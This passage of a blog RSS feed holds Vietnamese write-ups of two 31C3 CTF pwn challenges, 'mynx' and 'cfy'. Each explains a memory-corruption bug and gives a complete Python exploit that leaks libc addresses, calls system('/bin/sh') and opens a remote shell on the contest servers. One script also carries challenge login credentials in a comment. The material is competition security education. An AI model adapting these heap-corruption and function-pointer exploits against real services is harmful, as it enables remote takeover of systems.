+<p><a href="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-11at30525AM_zps9153b11c.png"><img src="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-11at30525AM_zps9153b11c.png?resize=604%2C326" alt="" width="604" height="326" data-recalc-dims="1" /></a></p>
+<p><a href="https://i1.wp.com/i289.photobucket.com/albums/ll229/danh_st/johncena.gif"><img src="https://i1.wp.com/i289.photobucket.com/albums/ll229/danh_st/johncena.gif?resize=312%2C176" alt="" width="312" height="176" data-recalc-dims="1" /></a></p>
+<p>Payload: http://pastebin.com/n2G30Fk4</p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">237</post-id>	</item>
+		<item>
+		<title>[Write up] 31C3 mynx</title>
+		<link>https://babyphd.net/2015/01/03/write-up-31c3-mynx/</link>
+				<pubDate>Sat, 03 Jan 2015 10:01:27 +0000</pubDate>
+		<dc:creator><![CDATA[peternguyen]]></dc:creator>
+				<category><![CDATA[pwn]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=229</guid>
+				<description><![CDATA[Đây là một bài khá hay, mình phải mấy mấy tiếng đồng hồ để phân tích code. Đầu tiên chương trình tổ chức bộ nhớ, cấp phát như sau: Cấp phát 1 vùng nhớ 0x1000 bytes đầu tiên, và set 4 byte kế tiếp là length &#60;địa chỉ vùng nhớ&#62;&#60;độ dài phần tử&#62;(1) Vùng nhớ &#8230; <a href="https://babyphd.net/2015/01/03/write-up-31c3-mynx/" class="more-link">Continue reading <span class="screen-reader-text">[Write up] 31C3 mynx</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>Đây là một bài khá hay, mình phải mấy mấy tiếng đồng hồ để phân tích code.</p>
+<p>Đầu tiên chương trình tổ chức bộ nhớ, cấp phát như sau:</p>
+<p><a href="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80513PM_zps8cb11523.png"><img src="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80513PM_zps8cb11523.png?resize=604%2C229" alt="" width="604" height="229" data-recalc-dims="1" /></a></p>
+<p>Cấp phát 1 vùng nhớ 0x1000 bytes đầu tiên, và set 4 byte kế tiếp là length &lt;địa chỉ vùng nhớ&gt;&lt;độ dài phần tử&gt;(1)</p>
+<p>Vùng nhớ 0x1000 bytes này được chia nhỏ ra 16 phần, 1 phần là 256 bytes.</p>
+<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80606PM_zpsc221f81d.png?resize=604%2C198" alt="" width="604" height="198" data-recalc-dims="1" /></p>
+<p>Nếu vùng nhớ 0x1000 bytes này hết , chương trình sẽ tạo 1 vùng nhớ khác tiếp theo như (1)</p>
+<p>Cấu trúc của một ascii art được phân bố như sau:</p>
+<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80632PM_zps39c04618.png?resize=604%2C149" alt="" width="604" height="149" data-recalc-dims="1" /></p>
+<pre class="lang:c decode:true">struct ascii_art{
+     char tag; // tag của ascii_art có giá trị bằng 'I'
+     int id;
+     void (*filter)(char* content);
+     char content[247];
+};</pre>
+<p>Cấu trúc của một comment được phân bố như sau:</p>
+<p><a href="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80645PM_zps60860a85.png"><img src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80645PM_zps60860a85.png?resize=604%2C104" alt="" width="604" height="104" data-recalc-dims="1" /></a></p>
+<pre class="lang:c decode:true">struct comment{
+    char tag; // tag có giá trị bằng '7'
+    int id;
+    char content[251];
+}</pre>
+<p>Xem xét đoạn mã sau:</p>
+<p><img class="alignnone" src="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80625PM_zps3f35d054.png?resize=604%2C83" alt="" width="604" height="83" data-recalc-dims="1" /></p>
+<p>Sau khi tạo 1 block comment, chương trình đọc vào vùng content với giá trị là 252 bytes (lố 1 byte) dựa vào đây mình sẽ khai thác được lỗi, ghi đè giá trị tag của block kế, biến block comment -&gt; block ascii art, từ đó fake được filterfunc.</p>
+<p><a href="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80916PM_zps2f85890b.png"><img src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at80916PM_zps2f85890b.png?resize=604%2C337" alt="" width="604" height="337" data-recalc-dims="1" /></a></p>
+<p><a href="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at81442PM_zpse2e136b0.png"><img src="https://i2.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at81442PM_zpse2e136b0.png?resize=604%2C132" alt="" width="604" height="132" data-recalc-dims="1" /></a></p>
+<p>đoạn mã trên dùng để trigger bug khi biến block comment -&gt; block ascii art</p>
+<p>Các khai thác lỗi:</p>
+<pre class="lang:default decode:true">Tạo 1 block ascii art, tạo 2 block comment cho block ascii 1 , tạo block ascii art 2
++----------------------+
+|  Ascii Block 1       |
++----------------------+
+|  comment 1(1)        |
++----------------------+
+|  comment 2(1)        |
++----------------------+
+|  Ascii Block 2       |
++----------------------+
+
+Xóa hết comment block 1, tạo lại comment cho block 1 và block 2, dùng comment block 2, overwrite giá trị tag của Ascii Block 2 thành comment, dùng comment block 1 để overwrite comment block 2 thì Ascii Block 2
+
++----------------------+
+|  Ascii Block 1       |
++----------------------+
+|  comment 1(1)        |
++----------------------+
+|  comment 1(2)        |
++----------------------+
+|  Ascii Block 2       |
++----------------------+
+
+Trạng thái cần đạt được
+
++--------------------------------+
+|  Ascii Block 1                 |
++--------------------------------+
+|  comment 1(1)                  |
++--------------------------------+
+|  comment 2(1),block 2 fake     |
++--------------------------------+
+|  Ascii Block 2, comment 2 fake |
++--------------------------------+
+
+</pre>
+<p>Trigger bug và ta có</p>
+<p><a href="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at81310PM_zps714162e4.png"><img src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at81310PM_zps714162e4.png?resize=604%2C458" alt="" width="604" height="458" data-recalc-dims="1" /></a></p>
+<p>Do mình có thể control được filter_func và content, cho nên mình sẽ dùng printf và fmt để leak được địa chỉ __libc_main_start ở trên stack, từ đó tính được địa chỉ của hàm system</p>
+<p>Payload:</p>
+<pre class="lang:python decode:true  ">import socket
+from struct import *
+import telnetlib
+
+#+------------------+
+#|	Ascii Block 1 	|
+#+------------------+
+#|	comment 1 		|
+#+------------------+
+#|	comment 2 		|
+#+------------------+
+#|	Ascii Block 2 	|
+#+------------------+
+
+def connect(host,port):
+	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect((host,port))
+	return s
+
+def add_ascii_block(s,block):
+	s.send('1\n')
+	s.recv(1024)
+	s.recv(1024)
+	s.send('1\n')
+	s.recv(1024)
+	s.send(block)
+
+def add_comment_block(s,block):
+	s.send('1\n')
+	s.recv(1024)
+	s.send(block)
+
+def select_block_id(s,block_id):
+	s.send('3\n') # select
+	s.recv(1024)
+	s.recv(1024)
+	s.send(str(block_id) + '\n')
+	s.recv(1024)
+	s.recv(1024) # comment menu
+
+def back_to_main_menu(s):
+	s.recv(1024)
+	s.recv(1024) # comment menu
+	s.send('0\n') # back
+	s.recv(1024) # main menu
+	s.recv(1024)
+
+def leak_mem(s):
+	__libc_main = 0
+	fmt = '%p'*22 + '%s'
+	payload = pack('&lt;I',0x8048420) # printf
+	payload+= fmt + 'A'*(0xfb - 4 - len(fmt)) + '7'
+
+	s.recv(1024) # banner
+	s.recv(1024) # main menu
+	add_ascii_block(s,'A'*0xf6 + '\n') # add ascii block
+	s.recv(1024)
+	s.recv(1024) # main menu
+	select_block_id(s,1)
+	add_comment_block(s,'C'*0xfb + '\n') # add comment of block 1
+	s.recv(1024)
+	s.recv(1024) # comment menu
+	add_comment_block(s,'C'*0xfb + '\n') # add comment of block 1
+	back_to_main_menu(s)
+	add_ascii_block(s,'B'*0xf6 + '\n')
+	s.recv(1024)
+	s.recv(1024) # main menu
+	select_block_id(s,1)
+	s.send('2\n') # remove all comments of block 1
+	s.recv(1024)
+	s.recv(1024) # comment menu
+	add_comment_block(s,'D'*0xfb + '\n') # add comment of block 1
+	back_to_main_menu(s)
+	# add comment to block 2, change ascii block 2 into comment block 2
+	select_block_id(s,2)
+	add_comment_block(s,payload)
+	back_to_main_menu(s)
+	select_block_id(s,1)
+	# change 1st comment of block 2 into block 2
+	s.send('2\n') # remove all comments of block 1
+	s.recv(1024)
+	s.recv(1024) # comment menu
+	add_comment_block(s,'A'*0xfb + 'I') # mark that comment 1 of block 2 is block 2
+	back_to_main_menu(s)
+	select_block_id(s,2)
+	s.send('3\n') # trigger bug
+	d = s.recv(1024)
+	if '\xf7' in d:
+		index = d.index('\xf7')
+		__libc_main = d[index - 3:index + 1]
+		__libc_main = unpack('&lt;I',__libc_main)[0]
+	s.send('0\n') # back
+	s.recv(1024) 
+	s.recv(1024) # main menu
+	return __libc_main
+
+def exploit():
+	s = connect('188.40.18.80',1234)
+	__libc_main = leak_mem(s)
+	offset = 149824 # Ubuntu 14.10
+
+	if (__libc_main &amp; 0xf7000000) == 0xf7000000:
+		system_addr = __libc_main + offset
+
+		cmd = '/bin/sh\x00'
+
+		payload = pack('&lt;I',system_addr)
+		payload+= cmd + 'A'*(0xfb - 4 - len(cmd)) + '7'
+		print '[!!!] System(): ',hex(system_addr)
+
+		add_ascii_block(s,'A'*0xf6 + '\n') # add ascii block
+		s.recv(1024)
+		s.recv(1024) # main menu
+		select_block_id(s,3)
+		add_comment_block(s,'C'*0xfb + '\n') # add comment of block 1
+		s.recv(1024)
+		s.recv(1024) # comment menu
+		add_comment_block(s,'C'*0xfb + '\n') # add comment of block 1
+		back_to_main_menu(s)
+		add_ascii_block(s,'B'*0xf6 + '\n')
+		s.recv(1024)
+		s.recv(1024) # main menu
+		select_block_id(s,3)
+		s.send('2\n') # remove all comments of block 1
+		s.recv(1024)
+		s.recv(1024) # comment menu
+		add_comment_block(s,'D'*0xfb + '\n') # add comment of block 1
+		back_to_main_menu(s)
+		# add comment to block 2, change ascii block 2 into comment block 2
+		select_block_id(s,4)
+		add_comment_block(s,payload) # real payload
+		back_to_main_menu(s)
+		select_block_id(s,3)
+		# change 1st comment of block 2 into block 2
+		s.send('2\n') # remove all comments of block 1
+		s.recv(1024)
+		s.recv(1024) # comment menu
+		add_comment_block(s,'A'*0xfb + 'I') # mark that comment 1 of block 2 is block 2
+		back_to_main_menu(s)
+		select_block_id(s,4)
+		s.send('3\n') # trigger bug
+		print '[!!!] Shell is comming'
+		# interact socket with stdin,stdout
+		t = telnetlib.Telnet()
+		t.sock = s
+		t.interact()
+
+exploit()</pre>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">229</post-id>	</item>
+		<item>
+		<title>[Write Up] 31C3 cfy</title>
+		<link>https://babyphd.net/2015/01/03/write-up-31c3-cfy/</link>
+				<pubDate>Sat, 03 Jan 2015 10:00:35 +0000</pubDate>
+		<dc:creator><![CDATA[peternguyen]]></dc:creator>
+				<category><![CDATA[pwn]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=227</guid>
+				<description><![CDATA[Chạy chương trình, hiện ra 1 menu: What do you want to do? 0) parse from hex 1) parse from dec 2) parse from pointer 3) quit Chương trình parse input option vào như sau : option người dùng nhận vào ở rbp-0xc &#160; Kiểm tra giá trị rbp-0xc nếu bằng 3 thì thoát. Nhận input người dung &#8230; <a href="https://babyphd.net/2015/01/03/write-up-31c3-cfy/" class="more-link">Continue reading <span class="screen-reader-text">[Write Up] 31C3 cfy</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>Chạy chương trình, hiện ra 1 menu:</p>
+<pre class="lang:default decode:true">What do you want to do?
+0) parse from hex
+1) parse from dec
+2) parse from pointer
+3) quit</pre>
+<p>Chương trình parse input option vào như sau :</p>
+<p><a href="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at101738AM_zps0db0c6e5.png"><img src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at101738AM_zps0db0c6e5.png?resize=604%2C346" alt="" width="604" height="346" data-recalc-dims="1" /></a></p>
+<p>option người dùng nhận vào ở <strong>rbp-0xc</strong></p>
+<p>&nbsp;</p>
+<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at101756AM_zps82fd6b1e.png?resize=604%2C145" alt="" width="604" height="145" data-recalc-dims="1" /></p>
+<p>Kiểm tra giá trị<strong> rbp-0xc</strong> nếu bằng 3 thì thoát.</p>
+<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at101819AM_zps71f3f5cc.png?resize=604%2C398" alt="" width="604" height="398" data-recalc-dims="1" /></p>
+<p>Nhận input người dung vào địa chỉ <strong>0x6010e0</strong> dùng option mà người dụng chọn tính ra hàm tương ứng cần gọi (<strong>0x601080</strong> lưu địa chỉ các hàm : fromhex,fromdec,fromptr)</p>
+<pre class="lang:default decode:true">rax = (long *)0x601080[$(rbp-c)]; mov rdi,0x6010e0; call eax;
+</pre>
+<p>để ý lúc kiểm tra option nhập vào trương trình chỉ kiểm tra đk $(rbp-0xc) != 3 thì sẽ execute đoạn trên. Để ý địa chỉ input lớn hơn địa chỉ lưu trữ các hàm, nếu nhập input &gt; 3 thì ta sẽ có : <strong>0x601080 + $(rbp-0xc)*8 </strong>với 1 giá trị x của <strong>$(rbp-0xc)</strong> thì eax sẽ trỏ tới input của mình và mình có thể kiếm soát đc call eax.</p>
+<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2014-12-31at102146AM_zps22cbdb58.png?resize=604%2C483" alt="" width="604" height="483" data-recalc-dims="1" /></p>
+<p>Ngoài ra, hàm fromptr có thể cho phép mình đọc bất kỳ vùng nhớ nào.</p>
+<p>Payload sẽ là:</p>
+<p>- dùng hàm fromptr để leak địa chỉ 1 hàm trong libc, dự đoán phiên bản libc đang chạy trên server (ở đây là ubuntu 14.10) , có offset từ hàm đó đến system</p>
+<p>- sử dụng bug trên để eax=system, và argv = /bin/sh</p>
+<pre class="lang:python decode:true  ">import socket
+from struct import *
+import telnetlib
+# 116064
+# Login: cfy_pwn // 31C3_G0nna_keep&lt;on&gt;grynding
+def connect(host,port):
+	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect((host,port))
+	return s
+
+def build_payload(system_addr):
+	shell = '/bin/sh\x00'
+	buff_addr = 0x6010e0
+	func_addr = 0x601080
+
+	payload = shell + '\x00'*8
+	jmp_offset = 6 + (len(payload) &gt;&gt; 4)
+	payload += pack('&lt;Q',system_addr) + '\n'
+
+	return (jmp_offset,payload)
+
+def exploit():
+	offset = 179728
+
+	s = connect('188.40.18.73',3313)
+	s.recv(1024) # banner
+	# leak libc addr
+	s.send('2\n')
+	s.recv(1024)
+	s.send(pack('&lt;Q',0x601018) + '\n') # puts@got
+	leak_addr_str = s.recv(1024).split('\n')
+	leak_addr = int(leak_addr_str[1].replace('hex: ',''),16)
+
+	system_addr = leak_addr - offset
+	print '[+] system():',hex(system_addr)
+	jmp_offset,payload = build_payload(system_addr)
+	# send payload
+	s.recv(1024)
+	s.send(str(jmp_offset) + '\n')
+	s.recv(1024)
+	s.send(payload)
+
+	# interact socket with stdin,stdout
+	t = telnetlib.Telnet()
+	t.sock = s
+	t.interact()
+
+exploit()</pre>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">227</post-id>	</item>
+	</channel>
+</rss>
